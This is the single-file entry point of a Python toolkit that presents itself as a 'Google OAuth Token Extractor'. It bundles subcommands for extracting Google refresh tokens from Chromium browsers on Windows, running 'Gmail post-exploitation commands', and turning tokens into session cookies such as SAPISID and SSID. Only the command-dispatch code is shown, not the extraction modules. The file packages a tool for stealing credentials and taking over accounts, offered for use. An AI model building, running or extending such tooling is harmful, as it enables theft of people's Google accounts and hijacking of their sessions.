#!/usr/bin/env python3
"""Google OAuth Token Extractor Toolkit — single-file zipapp entry point.

This module is the archive root of ``goe.pyz``. It bundles
the toolkit's three scripts behind one command with subcommands, so the whole
project ships as a single ``.pyz`` file::

    py goe.pyz extract [options]   # extract_tokens_windows.py
    py goe.pyz test <args>         # test_token.py
    py goe.pyz session <args>      # token_to_session.py

Each command is imported lazily and the subcommand token is stripped from
``sys.argv`` before the target module's own ``main()`` runs, so every script
keeps its exact standalone argument parsing. Running a script directly
(``python test_token.py ...``) is unaffected.

Third-party packages (``requests``, ``pywin32``, ``pycryptodome``) are NOT
bundled by a plain zipapp — they must be installed on the target machine::

    pip install -r requirements.txt
"""

import importlib
import os
import sys

VERSION = "1.0.0"

# subcommand -> (bundled module, one-line description)
COMMANDS = {
    "extract": (
        "extract_tokens_windows",
        "Live extraction of 1// refresh tokens from Chromium browsers (Windows only)",
    ),
    "test": (
        "test_token",
        "Validate tokens and run the Gmail post-exploitation commands",
    ),
    "session": (
        "token_to_session",
        "Convert a 1// token into browser session cookies (SAPISID/SSID/...)",
    ),
}


def _prog():
    """Name to show in usage/help text, derived from how we were invoked."""
    return os.path.basename(sys.argv[0]) or "goe.pyz"


def print_usage(stream=sys.stdout):
    """Print the top-level command list."""
    width = max(len(name) for name in COMMANDS)
    print(f"Google OAuth Token Extractor Toolkit v{VERSION}", file=stream)
    print("", file=stream)
    print(f"usage: {_prog()} <command> [args...]", file=stream)
    print("", file=stream)
    print("commands:", file=stream)
    for name, (_, desc) in COMMANDS.items():
        print(f"  {name:<{width}}  {desc}", file=stream)
    print("", file=stream)
    print(f"run '{_prog()} <command> --help' for command-specific options.",
          file=stream)


def _load(module_name):
    """Import a bundled command module, with a friendly error on a missing dep."""
    try:
        return importlib.import_module(module_name)
    except ImportError as exc:
        print(f"ERROR: cannot load '{module_name}': {exc}", file=sys.stderr)
        print("Install dependencies with: pip install -r requirements.txt",
              file=sys.stderr)
        sys.exit(1)


def main(argv=None):
    argv = list(sys.argv[1:] if argv is None else argv)

    if not argv or argv[0] in ("-h", "--help", "help"):
        print_usage()
        # No command given is an error; an explicit -h/help is not.
        return 0 if argv else 1

    if argv[0] in ("-V", "--version", "version"):
        print(f"goe {VERSION}")
        return 0

    command = argv[0]
    if command not in COMMANDS:
        print(f"error: unknown command '{command}'", file=sys.stderr)
        print("", file=sys.stderr)
        print_usage(sys.stderr)
        return 2

    module_name, _ = COMMANDS[command]
    rest = argv[1:]

    # Make the target script's own argv parsing behave as if it had been
    # invoked standalone: sys.argv[0] is "<prog> <command>", sys.argv[1:] the
    # real arguments. This is what lets test_token.py (sys.argv[1:]) and
    # token_to_session.py (sys.argv[1], loop from index 2) work unchanged.
    sys.argv = [f"{_prog()} {command}"] + rest

    module = _load(module_name)
    try:
        module.main()
    except SystemExit as exc:
        # Propagate the script's exit status (argparse errors, sys.exit(1), ...).
        code = exc.code
        if code is None:
            return 0
        if isinstance(code, int):
            return code
        print(code, file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())